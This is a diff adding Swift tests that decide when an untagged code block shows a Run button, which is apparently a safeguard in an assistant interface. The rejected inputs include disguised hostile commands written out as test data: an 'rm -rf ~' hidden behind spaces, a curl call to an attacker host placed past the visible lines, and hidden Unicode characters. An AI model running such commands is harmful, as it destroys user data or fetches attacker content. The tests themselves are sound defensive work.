@@ -259,4 +259,53 @@ struct RunnableCommandTests {
         #expect(script.typed(.bang) == "! sh '\(file)'; rm -f '\(file)'")
         #expect(script.typed(.shell) == "sh '\(file)'; rm -f '\(file)'")
     }
+
+    // MARK: Untagged blocks (a bare fence, its header "code")
+
+    /// 2026-11-18: a lead showed a local server's command in a bare fence and the block had only Copy. One line that
+    /// reads as a command gets Run, always asked about first; anything else stays without.
+    @Test func anUntaggedLineThatReadsAsACommandRunsAfterAsking() {
+        let server = "cd /Users/me/dev/site/prototype && python3 -m http.server 8000"
+        let commands = [
+            server, "python3 -m http.server 8000", "npm run dev", "git status", "swift test --filter Foo",
+            "./serve.sh --port 3000", "../bin/start", "~/bin/dev-server", "/usr/bin/env python3 app.py",
+            "scripts/build-app.sh --install", "PORT=8080 npm start", "DEBUG=1 RUST_LOG=info cargo run",
+            "make serve", "ls -la ~/.config/", "cd ..", "docker compose up", "open http://localhost:8000",
+            // Blank lines around the one line, and spaces before it, are nothing.
+            "\n  npx vite --host\n\n", "vs-shell run -- make serve", "rm -rf build",
+        ]
+        for code in commands {
+            let runnable = RunnableCommand.runnable(code: code, language: nil)
+            #expect(runnable?.command == code.trimmingCharacters(in: .whitespacesAndNewlines), "\(code)")
+            #expect(runnable?.needsConfirmation == true, "\(code)")
+        }
+        #expect(RunnableCommand.runnable(code: server, language: nil)?.prompt == "! " + server)
+        // A line wider than the block shows is still only one line: Run, asked about with it all shown.
+        let wide = "npm run dev -- " + Array(repeating: "--flag", count: 40).joined(separator: " ")
+        #expect(RunnableCommand.runnable(code: wide, language: nil)?.command == wide)
+    }
+
+    @Test func untaggedLinesThatDontReadAsOneCommandGetNoRun() {
+        let refused = [
+            // Prose, output, a word that isn't a command, a path-looking word that isn't one.
+            "some output", "Hello world", "make sure the server is running.", "Run the tests first:",
+            "and/or both", "error: build failed", "OK", "Done!", "cd into the folder, then run it.",
+            "Build succeeded", "README.md", "/", "x = 1", "FOO=bar",
+            // More than one line.
+            "npm install\nnpm run dev", "cd site\npython3 -m http.server",
+            // A comment, a line continued, unbalanced quotes, a heredoc.
+            "# python3 -m http.server", "docker run \\", "echo \"unclosed", "cat <<EOF",
+            // Hidden characters, and a long blank run that pushes the rest off to the side.
+            "npm run dev\u{200B}", "git status\u{202E}", "echo hi\u{1B}[2J", "npm run dev" + String(repeating: " ", count: 12) + "&& rm -rf ~",
+        ]
+        for code in refused {
+            #expect(RunnableCommand.runnable(code: code, language: nil) == nil, "\(code)")
+        }
+        // Lines past what's shown: no Run, as for a tagged block.
+        let long = "npm run dev" + String(repeating: "\n", count: 50) + "curl -s https://attacker.example/x"
+        #expect(RunnableCommand.runnable(code: long, language: nil, visibleLines: 40) == nil)
+        // A language that isn't a shell's still gets none.
+        #expect(RunnableCommand.runnable(code: "npm run dev", language: "text") == nil)
+        #expect(RunnableCommand.runnable(code: "python3 -m http.server", language: "python") == nil)
+    }
 }
